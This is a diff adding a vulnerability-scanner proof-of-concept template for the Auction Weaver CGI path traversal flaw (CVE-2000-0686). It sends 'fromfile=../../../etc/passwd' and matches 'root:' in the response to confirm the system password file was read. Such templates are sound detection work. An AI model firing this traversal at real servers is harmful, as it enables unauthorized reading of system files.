@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "Auction Weaver CGI 脚本 1.03 及更早版本存在路径遍历漏洞，远程攻击者通过向 fromfile 参数提交包含 ../ 的恶意请求可读取服务器上任意文件。"
+id = "POC-AVE-2000-0854"
+name = "Auction Weaver CGI 任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0854"]
+vuln_id = [
+    "CVE-2000-0686",
+    "AVE-2000-0854",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "fromfile=../../../etc/passwd"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "bin:",
+    "daemon:",
+]
